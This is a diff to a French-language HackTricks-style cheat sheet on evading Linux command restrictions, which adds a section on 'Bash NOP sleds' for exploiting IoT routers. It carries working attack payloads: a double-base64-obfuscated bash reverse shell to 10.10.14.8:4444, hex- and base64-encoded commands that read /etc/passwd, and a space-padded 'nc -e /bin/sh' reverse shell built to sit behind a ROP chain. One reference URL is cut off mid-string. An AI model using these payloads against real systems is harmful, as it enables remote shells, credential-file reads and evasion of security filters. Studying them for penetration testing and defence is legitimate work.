@@ -1,10 +1,10 @@
-# Contournement des Restrictions Linux
+# Contournement des restrictions Linux
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Contournements des Limitations Courantes
+## Contournements des limitations courantes
 
-### Shell Inversé
+### Shell inversé
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
@@ -114,7 +114,7 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Contournement avec l'encodage hexadécimal
+### Contournement avec encodage hexadécimal
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -294,25 +294,49 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Contournement en lecture seule/noexec/distroless
+## Contournement Read-Only/Noexec/Distroless
 
-Si vous êtes à l'intérieur d'un système de fichiers avec les **protections en lecture seule et noexec** ou même dans un conteneur distroless, il existe encore des moyens d'**exécuter des binaires arbitraires, même un shell ! :**
+Si vous êtes dans un système de fichiers avec les **protections read-only et noexec** ou même dans un conteneur distroless, il existe encore des moyens d'**exécuter des binaires arbitraires, même un shell ! :**
+
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Contournement de Chroot et autres Jails
+## Contournement Chroot & autres Jails
+
 
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## Références et plus
+## Bash NOP Sled basé sur l'espace ("Bashsledding")
+
+Lorsqu'une vulnérabilité vous permet de contrôler partiellement un argument qui atteint finalement `system()` ou un autre shell, vous ne connaissez peut-être pas le décalage exact à partir duquel l'exécution commence à lire votre charge utile. Les NOP sleds traditionnels (par exemple `\x90`) ne fonctionnent **pas** dans la syntaxe shell, mais Bash ignorera sans danger les espaces vides en début de ligne avant d'exécuter une commande.
+
+Par conséquent, vous pouvez créer un *NOP sled pour Bash* en préfixant votre vraie commande avec une longue séquence d'espaces ou de caractères de tabulation :
+```bash
+# Payload sprayed into an environment variable / NVRAM entry
+"                nc -e /bin/sh 10.0.0.1 4444"
+# 16× spaces ───┘ ↑ real command
+```
+Si une chaîne ROP (ou tout autre primitive de corruption de mémoire) place le pointeur d'instruction n'importe où dans le bloc d'espace, le parseur Bash ignore simplement les espaces jusqu'à atteindre `nc`, exécutant votre commande de manière fiable.
+
+Cas d'utilisation pratiques :
+
+1. **Blobs de configuration mappés en mémoire** (par exemple, NVRAM) accessibles à travers les processus.
+2. Situations où l'attaquant ne peut pas écrire de bytes NULL pour aligner la charge utile.
+3. Dispositifs embarqués où seul `ash`/`sh` de BusyBox est disponible – ils ignorent également les espaces de début.
+
+> 🛠️  Combinez cette astuce avec des gadgets ROP qui appellent `system()` pour augmenter considérablement la fiabilité de l'exploitation sur des routeurs IoT à mémoire limitée.
+
+## Références & Plus
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 - [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+
+- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../banners/hacktricks-training.md}}
